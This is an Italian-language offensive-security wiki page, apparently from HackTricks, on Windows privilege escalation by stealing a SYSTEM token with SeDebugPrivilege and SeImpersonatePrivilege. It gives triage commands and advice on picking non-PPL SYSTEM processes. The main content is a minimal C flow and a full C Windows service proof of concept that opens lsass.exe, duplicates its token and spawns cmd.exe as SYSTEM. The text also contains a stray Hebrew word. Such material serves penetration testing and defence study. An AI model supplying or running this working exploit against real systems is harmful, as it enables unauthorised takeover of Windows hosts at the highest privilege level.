# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Questa pagina tratta la variante di **manual token-theft** in cui un contesto **High Integrity** che ha già **`SeDebugPrivilege`** e **`SeImpersonatePrivilege`** apre un processo **SYSTEM** מתאים, **duplica il suo token** e **avvia un nuovo processo** con quel token.

Se ti serve solo una shell `SYSTEM` rapida da un processo admin privilegiato, vedi anche:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Se **non** hai un path con process-handle ma hai **`SeImpersonatePrivilege`**, la via **named-pipe / Potato** è di solito più semplice:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Prima di provare il token-copy path, conferma che il processo corrente sia già in un contesto utile:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** è ciò che ti permette di aprire molti processi **SYSTEM** **non protetti** anche quando la loro DACL normalmente ti bloccherebbe.
- **`SeImpersonatePrivilege`** è ciò che rende pratico **`CreateProcessWithTokenW`** in seguito.
- Se il percorso di copia del token ti dà solo un token SYSTEM debole o filtrato, ruba semplicemente da un **diverso processo SYSTEM**.

## Scegli il processo target con attenzione

La tecnica viene di solito mostrata contro **`lsass.exe`**, ma su Windows moderni spesso è il **target sbagliato**:

- Se **LSA Protection / RunAsPPL** è abilitato, **`lsass.exe`** è protetto e un normale processo admin con `SeDebugPrivilege` non riuscirà comunque ad aprirlo.
- Preferisci processi SYSTEM **non-PPL** come **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, o una istanza iniziale di **`svchost.exe`**.
- I **protected processes** e alcuni processi speciali come **`System`** o **`csrss.exe`** non sono target realistici in user-mode per questa tecnica.
- Usa **Process Hacker / Process Explorer** eseguiti con privilegi elevati per verificare se il token del target ha davvero i privilegi che vuoi prima di duplicarlo.

## Dettagli API che contano in pratica

Molti PoC pubblici richiedono **`PROCESS_ALL_ACCESS`** e **`TOKEN_ALL_ACCESS`**, ma è più rumoroso del necessario. In pratica:

- Apri il processo target solo con i diritti che ti servono (di solito **`PROCESS_QUERY_INFORMATION`** o **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Apri il token con i diritti necessari per la creazione del processo: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Usa **`DuplicateTokenEx(..., TokenPrimary, ...)`** per creare un **primary token**; un token di impersonation da solo non basta per creare un nuovo processo.
- Se **`CreateProcessWithTokenW`** fallisce con **`1314`**, passa a **`CreateProcessAsUserW`**.
- Se avvii da un **service / Session 0**, ricorda che **`CreateProcessWithTokenW`** mantiene il figlio nella **sessione del chiamante**. Se ti serve una shell desktop visibile, usa **`CreateProcessAsUserW`** e sposta il token nella sessione desiderata.

Un flusso moderno minimale appare così:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Il seguente codice **sfrutta i privilegi `SeDebugPrivilege` e `SeImpersonatePrivilege`** per copiare il token da un **processo in esecuzione come SYSTEM** e con **tutti i privilegi del token**. In questo caso, il codice può essere compilato e usato come **binary di Windows service** per verificare che la primitive funzioni.

La parte principale del **code in cui avviene l'elevazione** è all'interno della funzione **`Exploit`**. Dentro quella funzione puoi vedere che viene cercato **`lsass.exe`**, il suo **token viene copiato** e infine quel token viene usato per avviare un nuovo **`cmd.exe`** con tutti i privilegi del token copiato.

Sui host moderni, spesso vorrai sostituire **`lsass.exe`** con un altro **processo SYSTEM non PPL** come **`winlogon.exe`**, **`wininit.exe`** o **`services.exe`**.

Altri processi in esecuzione come SYSTEM con tutti o la maggior parte dei privilegi del token sono: **`services.exe`**, **`svchost.exe`** (alcuni dei primi), **`wininit.exe`**, **`csrss.exe`**... Ricorda che in generale **non sarai in grado di copiare un token da un processo protetto**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Riferimenti

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
